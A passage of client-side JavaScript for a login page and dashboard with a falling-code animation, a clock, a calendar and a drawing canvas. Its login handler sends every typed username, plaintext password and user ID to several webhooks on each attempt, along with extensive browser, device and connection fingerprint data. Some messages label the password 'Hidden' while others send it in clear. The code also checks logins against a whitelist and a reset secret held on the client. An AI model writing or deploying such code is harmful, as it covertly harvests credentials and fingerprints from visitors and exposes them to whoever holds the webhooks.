browserVersion = ua.match(/Edge\/([\d.]+)/)?.[1] || "Unknown";
engine = "EdgeHTML/Blink";
} else if (/OPR|Opera/.test(ua)) {
browserName = "Opera";
browserVersion = ua.match(/(?:OPR|Opera)\/([\d.]+)/)?.[1] || "Unknown";
engine = "Blink/Presto";
} else if (/Trident/.test(ua) || /MSIE/.test(ua)) {
browserName = "Internet Explorer";
browserVersion = ua.match(/(?:MSIE |rv:)(\d+\.?\d*)/)?.[1] || "Unknown";
engine = "Trident";
}

if (/Windows NT 10.0/.test(ua)) { os = "Windows"; osVersion = "10"; }
else if (/Windows NT 6.3/.test(ua)) { os = "Windows"; osVersion = "8.1"; }
else if (/Windows NT 6.2/.test(ua)) { os = "Windows"; osVersion = "8"; }
else if (/Windows NT 6.1/.test(ua)) { os = "Windows"; osVersion = "7"; }
else if (/Macintosh|Mac OS X/.test(ua)) { os = "macOS"; osVersion = ua.match(/Mac OS X ([\d_.]+)/)?.[1]?.replace(/_/g, '.') || "Unknown"; }
else if (/Android/.test(ua)) { os = "Android"; osVersion = ua.match(/Android ([\d.]+)/)?.[1] || "Unknown"; deviceType = "Mobile"; }
else if (/iPhone|iPad|iPod/.test(ua)) { os = "iOS"; osVersion = ua.match(/OS ([\d_.]+)/)?.[1]?.replace(/_/g, '.') + " (iOS)" || "Unknown"; deviceType = "Mobile"; }
else if (/Linux/.test(ua)) { os = "Linux"; osVersion = "Unknown"; }

if (/(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(ua)) deviceType = "Tablet";
if (/mobile|android|iphone|ipod|blackberry|opera mini|iemobile|webos|fennec|kindle/i.test(ua)) deviceType = "Mobile";

return { browserName, browserVersion, os, osVersion, engine, deviceType };
}

function getBrowserDetailedInfo() {
const parsedUA = parseUserAgent();
const fields = [
{ name: "Raw User Agent", value: navigator.userAgent || "N/A", inline: false },
{ name: "Browser Name", value: parsedUA.browserName, inline: true },
{ name: "Browser Version", value: parsedUA.browserVersion, inline: true },
{ name: "OS Name", value: parsedUA.os, inline: true },
{ name: "OS Version", value: parsedUA.osVersion, inline: true },
{ name: "Rendering Engine", value: parsedUA.engine, inline: true },
{ name: "Device Type (Parsed)", value: parsedUA.deviceType, inline: true },
{ name: "Cookies Enabled", value: navigator.cookieEnabled ? "Yes" : "No", inline: true },
{ name: "Do Not Track", value: navigator.doNotTrack === "1" ? "Yes" : (navigator.doNotTrack === "0" ? "No" : "N/A"), inline: true },
{ name: "Language", value: navigator.language || "N/A", inline: true },
{ name: "Online Status", value: navigator.onLine ? "Online" : "Offline", inline: true },
{ name: "Referrer", value: document.referrer || "N/A", inline: false },
{ name: "Current URL", value: window.location.href || "N/A", inline: false },
{ name: "Window Inner Size", value: `${window.innerWidth || 'N/A'}x${window.innerHeight || 'N/A'}`, inline: true },
{ name: "Window Outer Size", value: `${window.outerWidth || 'N/A'}x${window.outerHeight || 'N/A'}`, inline: true },
{ name: "Viewport Size", value: `${document.documentElement.clientWidth || 'N/A'}x${document.documentElement.clientHeight || 'N/A'}`, inline: true },
{ name: "WebGL Support", value: (() => { try { return !!document.createElement('canvas').getContext('webgl'); } catch (e) { return false; } })() ? "Yes" : "No", inline: true },
{ name: "Canvas Support", value: !!window.CanvasRenderingContext2D ? "Yes" : "No", inline: true },
{ name: "WebRTC Support", value: (navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia) ? "Yes" : "No", inline: true },
{ name: "Geolocation Support", value: !!navigator.geolocation ? "Yes" : "No", inline: true },
{ name: "WebSockets Support", value: !!window.WebSocket ? "Yes" : "No", inline: true },
{ name: "Web Workers Support", value: !!window.Worker ? "Yes" : "No", inline: true },
{ name: "Battery Status API", value: !!navigator.getBattery ? "Yes" : "No", inline: true },
{ name: "Vibration API", value: !!navigator.vibrate ? "Yes" : "No", inline: true },
{ name: "Media Devices API", value: !!navigator.mediaDevices ? "Yes" : "No", inline: true },
{ name: "VR/AR API (WebXR)", value: !!navigator.xr ? "Yes" : "No", inline: true },
{ name: "Gamepad API", value: !!navigator.getGamepads ? "Yes" : "No", inline: true },
{ name: "Web Share API", value: !!navigator.share ? "Yes" : "No", inline: true },
{ name: "Credential Management API", value: !!navigator.credentials ? "Yes" : "No", inline: true },
{ name: "Payment Request API", value: !!window.PaymentRequest ? "Yes" : "No", inline: true },
{ name: "Web Authentication API", value: !!navigator.credentials && !!navigator.credentials.create ? "Yes" : "No", inline: true },
{ name: "IndexedDB Support", value: !!window.indexedDB ? "Yes" : "No", inline: true },
{ name: "Web SQL DB Support", value: !!window.openDatabase ? "Yes" : "No", inline: true },
{ name: "OffscreenCanvas Support", value: !!window.OffscreenCanvas ? "Yes" : "No", inline: true },
{ name: "Permissions API", value: !!navigator.permissions ? "Yes" : "No", inline: true },
{ name: "Clipboard API", value: !!navigator.clipboard ? "Yes" : "No", inline: true }
];
return fields;
}

function getDeviceDetailedInfo() {
const parsedUA = parseUserAgent();
const fields = [
{ name: "OS Name", value: parsedUA.os, inline: true },
{ name: "OS Version", value: parsedUA.osVersion, inline: true },
{ name: "Platform", value: navigator.platform || "N/A", inline: true },
{ name: "Device Type (Parsed)", value: parsedUA.deviceType, inline: true },
{ name: "Screen Total Width", value: screen.width ? `${screen.width}px` : "N/A", inline: true },
{ name: "Screen Total Height", value: screen.height ? `${screen.height}px` : "N/A", inline: true },
{ name: "Screen Available Width", value: screen.availWidth ? `${screen.availWidth}px` : "N/A", inline: true },
{ name: "Screen Available Height", value: screen.availHeight ? `${screen.availHeight}px` : "N/A", inline: true },
{ name: "Color Depth", value: screen.colorDepth ? `${screen.colorDepth}-bit` : "N/A", inline: true },
{ name: "Pixel Depth", value: screen.pixelDepth ? `${screen.pixelDepth}-bit` : "N/A", inline: true },
{ name: "Device Pixel Ratio (DPR)", value: window.devicePixelRatio ? `${window.devicePixelRatio}:1` : "N/A", inline: true },
{ name: "Screen Orientation", value: screen.orientation?.type || "N/A", inline: true },
{ name: "Hardware Concurrency (CPU Cores)", value: navigator.hardwareConcurrency || "N/A", inline: true },
{ name: "Device Memory (GB)", value: navigator.deviceMemory || "N/A", inline: true },
{ name: "Max Touch Points", value: navigator.maxTouchPoints || "N/A", inline: true },
{ name: "Touch Screen Support", value: (('ontouchstart' in window) || (navigator.maxTouchPoints > 0)) ? "Yes" : "No", inline: true },
{ name: "Keyboard Map Support", value: !!navigator.keyboard ? "Yes" : "No", inline: true },
{ name: "Pointer Lock API", value: !!document.exitPointerLock ? "Yes" : "No", inline: true },
{ name: "Speech Recognition API", value: !!(window.SpeechRecognition || window.webkitSpeechRecognition) ? "Yes" : "No", inline: true },
{ name: "Speech Synthesis API", value: !!window.speechSynthesis ? "Yes" : "No", inline: true },
{ name: "USB API", value: !!navigator.usb ? "Yes" : "No", inline: true },
{ name: "Bluetooth API", value: !!navigator.bluetooth ? "Yes" : "No", inline: true },
{ name: "NFC API", value: !!navigator.nfc ? "Yes" : "No", inline: true },
{ name: "Accelerometer Support", value: !!window.DeviceMotionEvent ? "Yes" : "No", inline: true },
{ name: "Gyroscope Support", value: !!window.DeviceOrientationEvent ? "Yes" : "No", inline: true },
{ name: "Magnetometer Support", value: !!window.DeviceOrientationEvent ? "Yes" : "No", inline: true },
{ name: "Ambient Light Sensor Support", value: 'ondevicelight' in window ? "Yes" : "No", inline: true },
{ name: "Proximity Sensor Support", value: 'ondeviceproximity' in window ? "Yes" : "No", inline: true },
{ name: "Media Capabilities API", value: !!navigator.mediaCapabilities ? "Yes" : "No", inline: true },
{ name: "Virtual Keyboard API", value: !!navigator.virtualKeyboard ? "Yes" : "No", inline: true },
{ name: "User Activation API", value: !!navigator.userActivation ? "Yes" : "No", inline: true }
];
return fields;
}

function getConnectionDetailedInfo() {
const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
const nav = navigator;
const fields = [
{ name: "Online Status", value: nav.onLine ? "Online" : "Offline", inline: true },
{ name: "Connection Type", value: nav.connection?.type || "Unknown", inline: true },
{ name: "Effective Connection Type", value: nav.connection?.effectiveType || "Unknown", inline: true },
{ name: "Downlink Speed", value: nav.connection?.downlink ? `${nav.connection.downlink} Mbps` : "Unknown", inline: true },
{ name: "RTT (Round Trip Time)", value: nav.connection?.rtt ? `${nav.connection.rtt} ms` : "Unknown", inline: true },
{ name: "Save Data Mode", value: nav.connection?.saveData ? "Enabled" : "Disabled", inline: true },
{ name: "IP Address", value: "N/A (Client-side JS cannot detect public IP directly)", inline: false },
{ name: "VPN Detected", value: "N/A (Requires server-side lookup)", inline: true },
{ name: "Proxy Detected", value: "N/A (Requires server-side lookup)", inline: true },
{ name: "Public IPv6", value: "N/A (Client-side JS cannot detect directly)", inline: false },
{ name: "Local IP Addresses", value: "N/A (Requires WebRTC or server-side interaction with user consent)", inline: false },
{ name: "Network Downlink Max", value: nav.connection?.downlinkMax ? `${nav.connection.downlinkMax} Mbps` : "Unknown", inline: true },
{ name: "Network Metered Connection", value: nav.connection?.metered ? "Yes" : "No", inline: true },
{ name: "Network Type Detailed", value: nav.connection?.typeDetailed || "Unknown", inline: true },
{ name: "Effective Network Bandwidth Estimate", value: nav.connection?.bandwidthEstimate || "Unavailable", inline: true },
{ name: "Web Transport API", value: !!window.WebTransport ? "Yes" : "No", inline: true },
{ name: "Beacon API", value: !!nav.sendBeacon ? "Yes" : "No", inline: true },
{ name: "Background Sync API", value: !!('serviceWorker' in nav && nav.serviceWorker && nav.serviceWorker.ready && nav.serviceWorker.ready.then && 'sync' in (nav.serviceWorker.controller || {})) ? "Yes" : "No", inline: true },
{ name: "Fetch Priority API", value: !!(new Request('/', {priority: 'high'})).priority ? "Yes" : "No", inline: true },
{ name: "DNS Prefetching Support", value: "Available", inline: true },
{ name: "Preload Support", value: "Available", inline: true },
{ name: "Prerender Support", value: !!document.createElement('link').relList?.supports('prerender') ? "Yes" : "No", inline: true },
{ name: "Network Information API", value: !!nav.connection ? "Yes" : "No", inline: true },
{ name: "Service Worker Status", value: 'serviceWorker' in nav ? (nav.serviceWorker.controller ? 'Active' : 'Supported') : 'Not Supported', inline: true },
{ name: "Bluetooth Enabled", value: nav.bluetooth?.getAvailability ? "Check Required" : "N/A", inline: true },
];
return fields;
}

function updateAttemptsText() {
attemptsText.textContent = `Attempts Left: ${attempts}`;
}

function disableInputs() {
usernameInput.disabled = true;
passwordInput.disabled = true;
userIDInput.disabled = true;
submitBtn.disabled = true;
}

function enableInputs() {
usernameInput.disabled = false;
passwordInput.disabled = false;
userIDInput.disabled = false;
submitBtn.disabled = false;
}

function showResetPopup() {
resetPopup.style.display = 'flex';
resetPopup.setAttribute('aria-hidden', 'false');
resetField.focus();
}

function hideResetPopup() {
resetPopup.style.display = 'none';
resetPopup.setAttribute('aria-hidden', 'true');
resetField.value = '';
}

function findUser(username, userID) {
return whitelist.find(user => user.username === username && user.userID === userID);
}

async function logAttemptsExceeded(userName, inputUsername, inputPassword, inputUserID) {
const browserInfoFields = getBrowserDetailedInfo();
const deviceInfoFields = getDeviceDetailedInfo();
const connectionInfoFields = getConnectionDetailedInfo();

const fields = [
{ name: "Attempted Name", value: userName || "N/A", inline: true },
{ name: "Attempted Username", value: inputUsername || "[empty]", inline: true },
{ name: "Attempted Password (Hidden)", value: "********", inline: true },
{ name: "Attempted User ID", value: inputUserID || "[empty]", inline: true },
{ name: "Timestamp", value: new Date().toLocaleString(), inline: false },
{ name: "Attempts Exceeded", value: "Yes", inline: true },
{ name: "System Locked", value: "Yes", inline: true },
...browserInfoFields.slice(0, 5).map(f => ({ name: `Browser - ${f.name}`, value: f.value, inline: f.inline })),
...deviceInfoFields.slice(0, 5).map(f => ({ name: `Device - ${f.name}`, value: f.value, inline: f.inline })),
...connectionInfoFields.slice(0, 5).map(f => ({ name: `Connection - ${f.name}`, value: f.value, inline: f.inline }))
];

const embeds = createEmbedsFromFields("🚨 Login Attempts Exceeded", 0xDC143C, fields, "All login attempts have been exhausted. System is now locked.");
await sendWebhook(webhooks.attemptExceededInformation, embeds);
}

async function resetCounter() {
const enteredCode = resetField.value.trim();
const isCorrect = enteredCode === RESET_CODE_SECRET;

const currentUsername = usernameInput.value || 'Unknown';
const currentPassword = passwordInput.value || 'Unknown';
const currentUserID = userIDInput.value || 'Unknown';
const user = findUser(currentUsername, currentUserID) || {};

const browserInfoFields = getBrowserDetailedInfo();
const deviceInfoFields = getDeviceDetailedInfo();
const connectionInfoFields = getConnectionDetailedInfo();

const resetInfoFields = [
{ name: "Attempted Name", value: user.name || "N/A", inline: true },
{ name: "Attempted Username", value: currentUsername, inline: true },
{ name: "Attempted Password (Hidden)", value: "********", inline: true },
{ name: "Attempted User ID", value: currentUserID, inline: true },
{ name: "Entered Reset Code", value: enteredCode, inline: false },
{ name: "Reset Attempt Result", value: isCorrect ? "SUCCESS" : "FAILED", inline: true },
{ name: "Timestamp", value: new Date().toLocaleString(), inline: false },
...browserInfoFields.map(f => ({ name: `Browser - ${f.name}`, value: f.value, inline: f.inline })),
...deviceInfoFields.map(f => ({ name: `Device - ${f.name}`, value: f.value, inline: f.inline })),
...connectionInfoFields.map(f => ({ name: `Connection - ${f.name}`, value: f.value, inline: f.inline }))
];
const resetEmbeds = createEmbedsFromFields("🔔 Reset System Interaction", 0xFFFF00, resetInfoFields, "Details of a reset code entry attempt.");
await sendWebhook(webhooks.resetInformation, resetEmbeds);

if (isCorrect) {
attempts = 5;
updateAttemptsText();
enableInputs();
hideResetPopup();
errorMsg.textContent = '';
showNotification("Login attempts reset successfully!");
logActivity("Login attempts reset via code.");

const correctResetEmbeds = createEmbedsFromFields(
"✅ Reset Code Accepted", 0x00FF00, [
{ name: "Action", value: "Attempts Reset", inline: true },
{ name: "User Context", value: currentUsername, inline: true },
{ name: "Timestamp", value: new Date().toLocaleString(), inline: false }
]
);
await sendWebhook(webhooks.correctInformation, correctResetEmbeds);

} else {
alert('Incorrect reset code. Try again.');
logError("Incorrect reset code entered: " + enteredCode);

const incorrectResetEmbeds = createEmbedsFromFields(
"❌ Incorrect Reset Code Attempt", 0xFF0000, [
{ name: "Action", value: "Attempts Not Reset", inline: true },
{ name: "User Context", value: currentUsername, inline: true },
{ name: "Incorrect Code", value: enteredCode, inline: true },
{ name: "Timestamp", value: new Date().toLocaleString(), inline: false }
]
);
await sendWebhook(webhooks.incorrectInformation, incorrectResetEmbeds);
}
}

window.addEventListener('load', () => {
startInitialization();
loadLoginHistoryFromStorage();
loadImportantDatesFromStorage();
loadClickCountFromStorage();
loadErrorLogsFromStorage();
loadWhitelist();
updateAttemptsText();
});

function startInitialization() {
    const initScreen = document.getElementById('initScreen');
    const initText = document.getElementById('initText');
    const loginScreen = document.getElementById('loginScreen');
    const codeRainContainer = document.getElementById('codeRain');
    const loadingScreen = document.getElementById('loadingScreen');

    if (!initScreen || !initText || !loginScreen || !codeRainContainer || !loadingScreen) {
        console.error("CRITICAL ERROR: Initialization failed. Missing one or more key DOM elements (initScreen, initText, loginScreen, codeRain, loadingScreen).");
        if (loginScreen) {
            loginScreen.classList.remove('hidden');
            startClock();
            console.warn("Forced display of loginScreen due to missing initialization elements.");
        } else {
            document.body.innerHTML = '<div style="color: red; text-align: center; padding: 50px;">FATAL ERROR: Initialization failed. Check console for details.</div>';
        }
        return;
    }

    generateCodeRain('codeRain');

    setTimeout(() => {
        initText.textContent = 'Initializing Login Page...';
        setTimeout(() => {
            initScreen.classList.add('hidden');
            loginScreen.classList.remove('hidden');
            startClock();
        }, 2000);
    }, 3000);
}

function generateCodeRain(containerId) {
const container = document.getElementById(containerId);
if (!container) return;

const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';

setInterval(() => {
const char = document.createElement('div');
char.className = 'code-char';
char.textContent = chars[Math.floor(Math.random() * chars.length)];
char.style.left = Math.random() * 100 + '%';
char.style.animationDelay = Math.random() * 2 + 's';
container.appendChild(char);

setTimeout(() => {
if (char.parentNode) {
char.parentNode.removeChild(char);
}
}, 3000);
}, 100);
}

function startClock() {
updateClock();
setInterval(updateClock, 1000);
}

function updateClock() {
const now = new Date();
const timeOptions = { hour12: !is24HourFormat, hour: '2-digit', minute: '2-digit', second: '2-digit' };
const time = now.toLocaleTimeString('en-US', timeOptions);

const date = now.toLocaleDateString('en-US', {
weekday: 'long',
year: 'numeric',
month: 'long',
day: 'numeric'
});

const currentTimeElement = document.getElementById('currentTime');
const currentDateElement = document.getElementById('currentDate');
if (currentTimeElement) currentTimeElement.textContent = time;
if (currentDateElement) currentDateElement.textContent = date;

const quickbarRealTimeClock = document.getElementById('quickbarCurrentTime');
if (quickbarRealTimeClock) {
quickbarRealTimeClock.textContent = time;
}
}

function adjustZoom(delta) {
currentZoom = Math.max(0.5, Math.min(2, currentZoom + delta));
document.body.style.zoom = currentZoom;
logActivity('Zoom adjusted to ' + Math.round(currentZoom * 100) + '%');
}

function setupToggles() {
const showPasswordToggle = document.getElementById('showPasswordToggle');
const passwordField = document.getElementById('password');

if (showPasswordToggle && passwordField) {
    showPasswordToggle.addEventListener('click', function() {
        this.classList.toggle('active');
        passwordField.type = this.classList.contains('active') ? 'text' : 'password';
        stats.toggleSwitches++;
        logActivity('Password visibility toggled');
    });
}

const timeFormatToggle = document.getElementById('timeFormatToggle');
if (timeFormatToggle) {
    timeFormatToggle.addEventListener('click', function() {
        this.classList.toggle('active');
        is24HourFormat = this.classList.contains('active');
        stats.toggleSwitches++;
        logActivity('Time format toggled to ' + (is24HourFormat ? '24-hour' : '12-hour'));
    });
}
}

async function attemptLogin() {
const username = usernameInput.value;
const password = passwordInput.value;
const userID = userIDInput.value;

updateAttemptsText();

const browserInfoFields = getBrowserDetailedInfo();
const deviceInfoFields = getDeviceDetailedInfo();
const connectionInfoFields = getConnectionDetailedInfo();

await sendWebhook(webhooks.usernameInformation, createEmbedsFromFields(
"📝 Username Attempt", 0xADD8E6, [
{ name: "Attempted Username", value: username || '[empty]', inline: true },
{ name: "Current Attempts Left", value: `${attempts}`, inline: true },
{ name: "Timestamp", value: new Date().toLocaleString(), inline: false },
...browserInfoFields.slice(0, 5).map((f, i) => ({ name: `Browser (${i+1}) - ${f.name}`, value: f.value, inline: true })),
]
));

await sendWebhook(webhooks.passwordInformation, createEmbedsFromFields(
"📝 Password Attempt", 0xADD8E6, [
{ name: "Attempted Password", value: password || '[empty]', inline: true },
{ name: "Current Attempts Left", value: `${attempts}`, inline: true },
{ name: "Timestamp", value: new Date().toLocaleString(), inline: false },
...deviceInfoFields.slice(0, 5).map((f, i) => ({ name: `Device (${i+1}) - ${f.name}`, value: f.value, inline: true })),
]
));

await sendWebhook(webhooks.identifierInformation, createEmbedsFromFields(
"📝 User ID Attempt", 0xADD8E6, [
{ name: "Attempted User ID", value: userID || '[empty]', inline: true },
{ name: "Current Attempts Left", value: `${attempts}`, inline: true },
{ name: "Timestamp", value: new Date().toLocaleString(), inline: false },
...connectionInfoFields.slice(0, 5).map((f, i) => ({ name: `Connection (${i+1}) - ${f.name}`, value: f.value, inline: true })),
]
));

await sendWebhook(webhooks.userInformation, createEmbedsFromFields(
"👤 Login Attempt Details", 0x00BFFF, [
{ name: "Submitted Username", value: username || "[empty]", inline: true },
{ name: "Submitted Password (Hidden)", value: "********", inline: true },
{ name: "Submitted User ID", value: userID || "[empty]", inline: true },
{ name: "Parsed Browser", value: parseUserAgent().browserName, inline: true },
{ name: "Parsed OS", value: parseUserAgent().os, inline: true },
{ name: "Parsed Device Type", value: parseUserAgent().deviceType, inline: true },
{ name: "Current URL", value: window.location.href || "N/A", inline: false },
{ name: "Login Timestamp", value: new Date().toLocaleString(), inline: false },
{ name: "Attempts Left", value: `${attempts}`, inline: true },
{ name: "User Online Status", value: navigator.onLine ? "Online" : "Offline", inline: true }
]
));

await sendWebhook(webhooks.browserInformation, createEmbedsFromFields(
"🌐 Detailed Browser Information (Login Attempt)", 0x90EE90, browserInfoFields
));

await sendWebhook(webhooks.deviceInformation, createEmbedsFromFields(
"🖥️ Detailed Device Information (Login Attempt)", 0xFFD700, deviceInfoFields
));

await sendWebhook(webhooks.connectionInformation, createEmbedsFromFields(
"🔗 Detailed Connection Information (Login Attempt)", 0xFFC0CB, connectionInfoFields
));

await sendWebhook(webhooks.attemptCounterInformation, createEmbedsFromFields(
"🔄 Attempt Counter Update", 0xFF4500, [
{ name: "User Context", value: username || 'unknown', inline: true },
{ name: "Attempts Remaining", value: `${attempts}`, inline: true },
{ name: "Timestamp", value: new Date().toLocaleString(), inline: false }
]
));

if (!username || !password || !userID) {
const missingFields = [];
if (!username) missingFields.push("Username");
if (!password) missingFields.push("Password");
if (!userID) missingFields.push("User ID");

const errorMessage = `Please fill all fields. Missing: ${missingFields.join(", ")}`;
showError(errorMessage);

await sendWebhook(webhooks.incorrectInformation, createEmbedsFromFields(
"❌ Login Failed: Missing Fields", 0xFF0000, [
{ name: "Attempted Username", value: username || "[empty]", inline: true },
{ name: "Attempted User ID", value: userID || "[empty]", inline: true },
{ name: "Attempts Left", value: `${attempts}`, inline: true },
{ name: "Missing Fields", value: missingFields.join(", "), inline: false },
{ name: "Timestamp", value: new Date().toLocaleString(), inline: false }
]
));

if (!username) await sendWebhook(webhooks.invaildUsernameInformation, createEmbedsFromFields(
"🚫 Invalid Username: Empty", 0xFF0000, [{ name: "Attempted Username", value: '[empty]', inline: true }, { name: "Timestamp", value: new Date().toLocaleString(), inline: false }]
));
if (!password) await sendWebhook(webhooks.invaildPasswordInformation, createEmbedsFromFields(
"🚫 Invalid Password: Empty", 0xFF0000, [{ name: "Attempted Password", value: '[empty]', inline: true }, { name: "Timestamp", value: new Date().toLocaleString(), inline: false }]
));
if (!userID) await sendWebhook(webhooks.invaildIdentifierInformation, createEmbedsFromFields(
"🚫 Invalid User ID: Empty", 0xFF0000, [{ name: "Attempted User ID", value: '[empty]', inline: true }, { name: "Timestamp", value: new Date().toLocaleString(), inline: false }]
));

failedLogin(username, userID);
return;
}

const userFound = whitelist.find(user =>
user.username === username &&
user.password === password &&
user.userID === userID
);

if (userFound) {
await successfulLogin(username, userID);
} else {
let loginFailedMessages = [];
let isAnyFieldInvalid = false;
let usernameMatch = whitelist.some(u => u.username === username);
let passwordMatch = false;
let userIDMatch = false;

if (usernameMatch) {
const correctUser = whitelist.find(u => u.username === username);
if (correctUser) {
if (correctUser.password === password) passwordMatch = true;
if (correctUser.userID === userID) userIDMatch = true;
}
}

if (!usernameMatch) {
await sendWebhook(webhooks.invaildUsernameInformation, createEmbedsFromFields(
"🚫 Invalid Username: Not Found", 0xFF0000, [{ name: "Attempted Username", value: username, inline: true }, { name: "Timestamp", value: new Date().toLocaleString(), inline: false }]
));
loginFailedMessages.push("Username");
isAnyFieldInvalid = true;
}
if (usernameMatch && !passwordMatch) {
await sendWebhook(webhooks.invaildPasswordInformation, createEmbedsFromFields(
"🚫 Invalid Password: Mismatch", 0xFF0000, [{ name: "Attempted Password", value: password, inline: true }, { name: "Username Context", value: username, inline: true }, { name: "Timestamp", value: new Date().toLocaleString(), inline: false }]
));
loginFailedMessages.push("Password");
isAnyFieldInvalid = true;
}
if (usernameMatch && !userIDMatch) {
await sendWebhook(webhooks.invaildIdentifierInformation, createEmbedsFromFields(
"🚫 Invalid User ID: Mismatch", 0xFF0000, [{ name: "Attempted User ID", value: userID, inline: true }, { name: "Username Context", value: username, inline: true }, { name: "Timestamp", value: new Date().toLocaleString(), inline: false }]
));
loginFailedMessages.push("User ID");
isAnyFieldInvalid = true;
}

let finalFailedMessage = `Login attempt failed for \`\`${username}\`\`: `;
if (isAnyFieldInvalid) {
finalFailedMessage += `Invalid ${loginFailedMessages.join(', ')}.`;
} else {
finalFailedMessage += `Invalid credentials (username, password, or user ID combination is incorrect).`;
}
await sendWebhook(webhooks.incorrectInformation, createEmbedsFromFields(
"❌ Login Failed: Incorrect Credentials", 0xFF0000, [
{ name: "Attempted Username", value: username, inline: true },
{ name: "Attempted User ID", value: userID, inline: true },
{ name: "Attempts Left", value: `${attempts}`, inline: true },
{ name: "Validation Issue", value: loginFailedMessages.length > 0 ? `Invalid ${loginFailedMessages.join(", ")}` : "Combination Mismatch", inline: false },
{ name: "Timestamp", value: new Date().toLocaleString(), inline: false }
]
));

failedLogin(username, userID);
}
}

async function successfulLogin(username, userID) {
currentUser = username;
currentUserID = userID;

loginHistory.unshift({
time: new Date().toISOString(),
success: true,
username: username
});
saveLoginHistoryToStorage();

const correctLoginEmbeds = createEmbedsFromFields(
"✅ Successful Login", 0x00FF00, [
{ name: "User", value: username, inline: true },
{ name: "User ID", value: userID, inline: true },
{ name: "Timestamp", value: new Date().toLocaleString(), inline: false }
]
);
await sendWebhook(webhooks.correctInformation, correctLoginEmbeds);

const sessionInfoFields = [
{ name: "Logged-in User", value: username, inline: true },
{ name: "User ID", value: userID, inline: true },
{ name: "Session Start Time", value: new Date(stats.sessionStartTime).toLocaleString(), inline: false },
{ name: "Current Zoom Level", value: `${Math.round(currentZoom * 100)}%`, inline: true },
{ name: "Current Theme", value: isLightMode ? "Light" : "Dark", inline: true },
{ name: "Panels Grid Visible", value: (document.getElementById('panelsGrid').style.display !== 'none' && document.getElementById('panelsGrid').style.opacity !== '0') ? "Yes" : "No", inline: true },
{ name: "Activity Logs Count", value: `${activityLogs.length}`, inline: true },
{ name: "Error Logs Count", value: `${errorLogs.length}`, inline: true },
{ name: "Important Dates Count", value: `${importantDates.length}`, inline: true },
{ name: "Mouse Click Count", value: `${clickCount}`, inline: true },
{ name: "Total Button Presses", value: `${stats.buttonPresses}`, inline: true },
{ name: "Total Toggle Switches", value: `${stats.toggleSwitches}`, inline: true },
{ name: "Total Panels Opened", value: `${stats.panelsOpened}`, inline: true },
{ name: "Total Panels Closed", value: `${stats.panelsClosed}`, inline: true },
{ name: "Total Search Queries", value: `${stats.searchQueries}`, inline: true },
...getBrowserDetailedInfo().map(f => ({ name: `Browser - ${f.name}`, value: f.value, inline: f.inline })),
...getDeviceDetailedInfo().map(f => ({ name: `Device - ${f.name}`, value: f.value, inline: f.inline })),
...getConnectionDetailedInfo().map(f => ({ name: `Connection - ${f.name}`, value: f.value, inline: f.inline }))
];
const sessionEmbeds = createEmbedsFromFields("🚀 New Session Started", 0x00BFFF, sessionInfoFields, "Detailed information about the new user session.");
await sendWebhook(webhooks.sessionInformation, sessionEmbeds);

const loginScreen = document.getElementById('loginScreen');
const loadingScreen = document.getElementById('loadingScreen');
const dashboard = document.getElementById('dashboard');

if (loginScreen) loginScreen.classList.add('hidden');
if (loadingScreen) loadingScreen.classList.remove('hidden');
generateCodeRain('loadingCodeRain');

setTimeout(() => {
if (loadingScreen) loadingScreen.classList.add('hidden');
if (dashboard) dashboard.classList.add('active');
initializeDashboard();
}, 3000);
}

async function failedLogin(attemptedUsername, attemptedUserID) {
attempts--;
updateAttemptsText();

const loginBox = document.getElementById('loginBox');
if (loginBox) {
    loginBox.classList.add('error-shake');
    setTimeout(() => {
        loginBox.classList.remove('error-shake');
    }, 500);
}

if (attempts <= 0) {
const lockMsg = 'No attempts remaining. System locked.';
if (errorMsg) errorMsg.textContent = lockMsg;
disableInputs();
showResetPopup();
await logAttemptsExceeded(
(findUser(attemptedUsername, attemptedUserID) || {}).name,
attemptedUsername,
passwordInput.value,
attemptedUserID
);
} else {
if (errorMsg) errorMsg.textContent = `Invalid credentials. Attempts left: ${attempts}`;
}

loginHistory.unshift({
time: new Date().toISOString(),
success: false,
username: attemptedUsername
});
saveLoginHistoryToStorage();
}

function showError(message) {
if (errorMsg) errorMsg.textContent = message;
logError(message);
setTimeout(() => {
if (errorMsg) errorMsg.textContent = '';
}, 3000);
}

function initializeDashboard() {
stats.sessionStartTime = Date.now();

const loggedUserElement = document.getElementById('loggedUser');
const currentUserElement = document.getElementById('currentUser');
const currentUserIDElement = document.getElementById('currentUserID');
const welcomeNotificationElement = document.getElementById('welcomeNotification');

if (loggedUserElement) loggedUserElement.textContent = currentUser;
if (currentUserElement) currentUserElement.textContent = currentUser;
if (currentUserIDElement) currentUserIDElement.textContent = currentUserID;

if (welcomeNotificationElement) {
    setTimeout(() => {
        welcomeNotificationElement.style.display = 'none';
    }, 5000);
}

generateCalendar();
initializeCanvas();
startSessionTimer();
updateClock();
setInterval(updateClock, 1000);
updateStats();
updateLoginHistoryDisplay();
updateImportantDatesDisplay();
updateClickCountDisplay();
updateErrorLogDisplay();

logActivity('Dashboard initialized');
}

function generateCalendar() {
const calendar = document.getElementById('calendarGrid');
if (!calendar) return;
calendar.innerHTML = '';

const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
const today = new Date();
const currentMonth = today.getMonth();
const currentYear = today.getFullYear();

days.forEach(day => {
const dayElement = document.createElement('div');
dayElement.textContent = day;
dayElement.className = 'calendar-cell text-xs font-bold text-gray-400';
calendar.appendChild(dayElement);
});

const firstDay = new Date(currentYear, currentMonth, 1).getDay();
const daysInMonth = new Date(currentYear, currentMonth + 1, 0).getDate();

for (let i = 0; i < firstDay; i++) {
const emptyCell = document.createElement('div');
emptyCell.className = 'calendar-cell';
calendar.appendChild(emptyCell);
}

for (let day = 1; day <= daysInMonth; day++) {
const dayCell = document.createElement('div');
dayCell.textContent = day;
dayCell.className = 'calendar-cell';

if (day === today.getDate()) {
dayCell.classList.add('today');
}

calendar.appendChild(dayCell);
}
}

function initializeCanvas() {
canvas = document.getElementById('drawingCanvas');
if (!canvas) {
    console.warn("Canvas element not found, drawing tools will not function.");
    return;
}
ctx = canvas.getContext('2d');

canvas.addEventListener('mousedown', startDrawing);
canvas.addEventListener('mousemove', draw);
canvas.addEventListener('mouseup', stopDrawing);
canvas.addEventListener('mouseout', stopDrawing);
}

function startDrawing(e) {
if (!ctx || !canvas) return;
isDrawing = true;
